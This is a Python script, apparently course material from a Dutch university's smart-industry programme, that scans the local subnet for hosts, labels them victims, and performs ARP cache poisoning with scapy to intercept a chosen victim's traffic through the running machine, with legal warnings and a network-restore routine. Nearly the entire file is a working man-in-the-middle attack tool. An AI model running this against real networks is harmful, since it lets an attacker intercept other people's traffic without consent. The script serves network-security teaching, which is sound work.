#!/usr/bin/env python3
#
# HAN University of Applied Sciences
# Academy of Engineering and Automotive
#
# AD Smart Industry - Connected Factory
#
# April 9, 2020
#
# J.A. Korten
#
# Tool om netwerkinformatie te krijgen...
# Tool to retrieve information from your network...
#
# See also: https://scapy.readthedocs.io/en/latest/usage.html
# https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
#
# ==============================
#  IMPORTANT LEGAL INFORMATION:
# ==============================
#
# WARNING: ARP Poisoning is potentially illegal unless you use it in your private network!
# Be sure to warn other home users and only use it for educational purposes!
# Of course this software or derivates can be also used by system administrators to perform their legal and necessary
# to perform security assessments etc. Include your direct manager and security officer before actively using this tool.
#
# Urgent note:
# Be prepared to bear the consequences (e.g. in school or company) if you misuse it!!!
#
# We provide this script in an educational context to educate students on network security
# and are not liable for possible damage caused by this software...
#
# WAARSCHUWING: ARP Poisoning is in principe illegaal dus gebruik het alleen in je privé netwerk!
# Waarschuw ook je medenetwerkgebruikers en gebruik dit alleen voor leerdoeleinden!
# Uiteraard kunnen deze tool en afgeleiden daarvan ook gebruikt worden door systeembeheerders voor het uitvoeren
# van hun taken. Overleg met uw manager en security officer alvorens deze software als zodanig te gebruiken.
#
# Belangrijke aantekening:
# Als je misbruik maakt van je kennis en vaardigheden (bijv. op school of in bedrijf) wees dan
# ook bereid de consequenties van die acties te dragen!!!
#
# Dit script bieden we aan als onderdeel van lessen over computernetwerkbeveleiding (security)
# en zijn op geen enkele manier verantwoordelijk voor mogelijk misbruik of schade welke hieruit voortvloeit...
#
# This file still needs to be refactored...
# Tested on macOS Catalina and Raspbian Buster
#

from __future__ import print_function
import socket
import psutil
from psutil._common import bytes2human
import netifaces
from scapy.all import *
from getmac import get_mac_address


import os
import signal
import sys
import threading
import time

class NIC:
    ifname = ""
    ip = "0.0.0.0"
    netmask = "0.0.0.0"
    mac_addr = "00:00:00:00:00:00"
    gateway = "0.0.0.0"

    def __init__(self, ifname, ip, netmask, mac_addr, gateway):
        self.ifname = ifname
        self.ip = ip
        self.netmask = netmask
        self.mac_addr = mac_addr
        self.gateway = gateway

    def __repr__(self):
        return "<NIC nic:%s, ip:%s, mask:%s, mac:%s, gw:%s>" % (self.ifname, self.ip, self.netmask, self.mac_addr, self.gateway)

    def __str__(self):
        return "nic:%s, ip:%s, mask:%s, mac:%s, gw:%s" % (self.ifname, self.ip, self.netmask, self.mac_addr, self.gateway)

class RemoteDevice:
    ip = "0.0.0.0"
    hostname = "Unknown"
    mac_addr = "00:00:00:00:00:00"

    def __init__(self, ip, hostname, mac_addr):
        self.ip = ip
        self.mac_addr = mac_addr
        if (hostname != "n/a"):
            self.hostname = hostname[0]
        else:
            self.hostname = hostname

    def __repr__(self):
        return "<NIC ip:%s, host:%s, mac:%s>" % (self.ip, self.hostname, self.mac_addr)

    def __str__(self):
        hostname = self.hostname
        if (len(hostname) < 10):
            hostname += "\t\t"
        else:
            if (len(hostname) < 16):
                hostname += "\t"
        return "%s\t%s\t%s" % (self.ip, hostname, self.mac_addr)


# Methods for ARP Poisoning:

# from https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None



# Network methods for scanning:


def find_append_victims(gateway, victimslist, newvictims, nics):
    _ip_items = gateway.ip.split(".")
    target_ip = "%s.%s.%s.%s" % (_ip_items[0], _ip_items[1], _ip_items[2], "0/24")

    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")

    # stack them
    packet = ether/arp
    result = srp(packet, timeout=10, verbose=0)[0]

    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        itemFound = False
        hostname = "n/a"
        try:
            hostname = socket.gethostbyaddr(received.psrc)
        except socket.herror:
            hostname = "n/a"

        item = RemoteDevice(received.psrc, hostname, received.hwsrc)
        for _item in victimslist:
            if (_item.ip == received.psrc):
                itemFound = True
                break

        for _item in nics:
            if (_item.ip == received.psrc):
                itemFound = True
                break

        if (itemFound == False):
            if (item.ip != gateway.ip): # skip if it is the gateway or own IP.
                newvictims.append(item)

def find_gateway(network_interface):
      Interfaces= netifaces.interfaces()
      for inter in Interfaces:
           #print(inter)
           if inter == network_interface:
                temp_list = []
                Addresses = netifaces.ifaddresses(inter)
                gws = netifaces.gateways()
                if (len(gws) > 0):
                    temp_list = list (gws['default'][netifaces.AF_INET])

                    count =0
                    for itemIP in temp_list:
                          count +=1
                          if count ==1:
                               #print (item)

                               mac = getmacbyip(itemIP)
                               hostname = "n/a"
                               try:
                                   hostname = socket.gethostbyaddr(itemIP)
                               except socket.herror:
                                   hostname = "n/a"
                               item = RemoteDevice(itemIP, hostname, mac)
                               return item
                          else:
                               pass

def checkAndAddGateway(nic, gateways):
    knownGateway = False
    gateway = None

    for item in gateways:
        if (item.ip == nic.gateway):
            knownGateway = True
            break

    if (knownGateway == False):
        hostname = "n/a"
        try:
            hostname = socket.gethostbyaddr(nic.gateway)
        except socket.herror:
            hostname = "n/a"
        gateways.append(RemoteDevice(nic.gateway, hostname, getmacbyip(nic.gateway)))
        #gateways.append(nic.gateway)
        #if nic.gateway not in gateways:
        #    _mac getMacOfGateway(nic.gateway)
        #    RemoteDevice
        #    gateways.append(nic.gateway)

def getLocalNetworkInterfaces():
    #
    #  Methode haalt lokale netwerk interfaces op (getest op macOS)
    #  Methods gets local network interfaces (tested on macOS)
    #
    stats = psutil.net_if_stats()
    io_counters = psutil.net_io_counters(pernic=True)
    ip_addresses = []

    for nic, addrs in psutil.net_if_addrs().items():
        hasBroadcastAddress = False
        #print(nic)
        for addr in addrs:

            if addr.broadcast != None:
                hasBroadcastAddress = True


        if (hasBroadcastAddress == True):
            _if = nic
            _ip = ""
            _nm = ""
            _ma = ""
            _gw = ""

            for addr in addrs:
                #print(addr.family)
                if (str(addr.family) == "AddressFamily.AF_INET"):
                    _ip = str(addr.address)
                    _nm = str(addr.netmask)

                if (str(addr.family) == "AddressFamily.AF_LINK"):
                    _ma = str(addr.address)

            _gw = find_gateway(nic).ip

            _nic = NIC(_if, _ip, _nm, _ma, _gw)

            if (_ip != ""):
                ip_addresses.append(_nic)
    return ip_addresses

def printLegalHeader():
    print("\n=============================================================================================")
    print(" Important Notice: \n Please read legal information in the header of this software file to stay out of trouble!")
    print("=============================================================================================\n")

def printFinalWarning():
    print("\n WARNING: ARP Poisoning is potentially illegal unless you use it in your private network!\n Be sure to warn other home users and only use it for educational purposes!")
    print(" Be prepared to bear the consequences in e.g. school or company if you misuse it!!!\n")

def printNicInfo(nics):
    if (len(nics) > 1):
        print("\nNetwork interfaces on this device:")
    else:
        if (len(nics) == 1):
            print("\nNetwork interface on this device:")
        else:
            print(" Sorry, you need to have at least one (active) network interface device for this software. \n Aborting now...\n")
            return

def printVictimsHeader(possible_victims, label):
    print("\nFound a total of " + str(possible_victims) + " potential victims (excluding " + label + ").\n")
    print("Next step: ARP Poisoning...")
    print("Select NIC, Gateway and Victim:")

def printAndSelectNic(possible_nics, nics):
    _nic = 1
    if (possible_nics > 1):
        _nic = 1
        _nic = input("\nChoose your Network Interface Controller (1-" + str(possible_nics) + ") [default=1]: ")
        if (not _nic.isnumeric()):
            _nic = 1
        if ((int(_nic) > 0) and (int(_nic) <= possible_nics)):
            print("\nYou chose: " + str(nics[int(_nic)-1]))
    else:
        print("\nDefault NIC was selected:\n" + str(nics[0]))
    return _nic

def printAndSelectGW(possible_gateways, gateways):
    _gws = 1
    if (possible_gateways > 1):
        _gws = 1
        _gws = input("\nChoose your Gateways (1-" + str(possible_gateways) + ") [default=1]: ")
        if (not _gws.isnumeric()):
            _gws = 1
        if ((int(_gws) > 0) and (int(_gws) <= possible_gateways)):
            print("\nYou chose: " + str(gateways[int(_gws)-1]))
    else:
        print("\nDefault Gateway was selected:\n" + str(gateways[0]))
    return _gws

def printAndSelectVictim(possible_victims, victims):
    _vic = 1
    if (possible_victims > 1):
        _vic = 1
        _vic = input("\nChoose your Victim (1-" + str(possible_victims) + ") [default=1]: ")
        if (not _vic.isnumeric()):
            _vic = 1
        if ((int(_vic) > 0) and (int(_vic) <= possible_victims)):
            print("\nYou chose: " + str(victims[int(_vic)-1]))
    else:
        print("\nOnly Victim was selected:\n" + str(victims[0]))
    return _vic

def retrieveAndShowVictims(gateways, victims, nics, runs=5):
    i = 1 # counter
    print("\nScanning for possible victims...\n")
    headersPrinted = False
    for multiple_runs in range(0, runs):
        #print("Run: " + str(multiple_runs))
        for gw in gateways:
            _new_victims = []
            find_append_victims(gw, victims, _new_victims, nics)
            if (len(_new_victims) > 0):
                victims = victims + _new_victims
                if (headersPrinted == False):
                    print("\n\tIP\t\tHOST\t\t\tMAC [others]")
                    print("==================================================================")
                    headersPrinted = True

            for victim in _new_victims:
                print("[" + str(i) + "] \t" + str(victim))
                i += 1
    return victims

def retrieveAndShowGateways(gateways, nics):
    gwLabel = "gateway"
    i = 1
    if (len(gateways) > 0):
        print("\tIP\t\tHOST\t\t\tMAC [" + gwLabel + "]")
        print("==================================================================")
        i = 1
        for gw in gateways:
            if (len(gateways) == 1):
                gwLabel = "gateway"
            else:
                gwLabel = "gateways"
            print("[" + str(i) + "]\t" + str(gw))
            i += 1
    return i - 1

def getGatewaysFromNic(nics, gateways):
    i = 1
    for nic in nics:
        print("[" + str(i) + "] Network Interface Card:\n" + str(nic) + "\n")
        checkAndAddGateway(nic, gateways)
        i += 1
    return i-1

def askToContinue():
    _answer = input("\nDo you really want to start AR Poisoning your victim? [N/y]: ")
    if ((_answer == "Y") or (_answer == "y")):
        print("\nOK, setting up AR Poisoning now...\n")
        return True
    else:
        print("\nOK, finished now...\n")
        return False

def main():

    nics     = [] # local network 'cards'
    gateways = []     # gateway(s)
    victims  = []      # other network devices
    possible_nics     = 0
    possible_gateways = 0
    possible_victims  = 0

    _selected_nic    = 0
    _selected_gw     = 0
    _selected_victim = 0

    printLegalHeader()

    # 1. Get the local interfaces (this device)
    nics = getLocalNetworkInterfaces()
    printNicInfo(nics)
    possible_nics = getGatewaysFromNic(nics, gateways)

    # 2. Get the information of the gateway(s)
    possible_gateways = retrieveAndShowGateways(gateways, nics)

    # 3. Get the information of the possible 'victims'
    victims = retrieveAndShowVictims(gateways, victims, nics, runs=3)
    possible_victims = len(victims)

    printVictimsHeader(possible_victims, "nic(s) and gateway(s)")

    # 4. Select NIC to perform attack with
    _selected_nic = printAndSelectNic(possible_nics, nics)

    # 5. Select Gateway to perform attack with
    _selected_gw = printAndSelectGW(possible_gateways, gateways)

    # 6. Select Victim to poison
    _selected_victim = printAndSelectVictim(possible_victims, victims)

    printFinalWarning()

    # 7. Ask if user wants to really ARP poison the victim
    doContinue = askToContinue()
    if (not doContinue):
        return

    # 8. Ok, let's ARP poison the victim then!

    try:

        _gw = gateways[int(_selected_gw)-1]
        _gw_ip = _gw.ip
        _gw_mac = _gw.mac_addr
        print("IP GW: " + str(_gw_ip))
        print("MAC GW: " + str(_gw_mac))
        print("")

        _vt = victims[int(_selected_victim)-1]
        _vt_ip = _vt.ip
        _vt_mac = _vt.mac_addr

        print("IP Victim: " + str(_vt_ip))
        print("MAC Victim: " + str(_vt_mac))

        #print("IP VICTIM: " + str(victims[int(_selected_victim)-1])).split("\t")[0])
        #_victim_mac = obtain_mac(victims[int(_selected_victim)-1], nics[int(_selected_nic)-1])
        #print("MAC Victim: " + str(_victim_mac))

        print("Poisoning in progress...")

        # arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):

        arp_poison(_gw_ip, _gw_mac, _vt_ip, _vt_mac)

        # 9. Restore network... also on an exception (try at least...)

        # restore_network(_gw_ip, _gw_mac, _vt_ip, _vt_mac) is already called in arp_poison on CTRL+C
    except (KeyboardInterrupt, SystemExit):
        #restore_network()
        restore_network(_gw_ip, _gw_mac, _vt_ip, _vt_mac)
        print("Network was restored...")


if __name__ == '__main__':
    main()
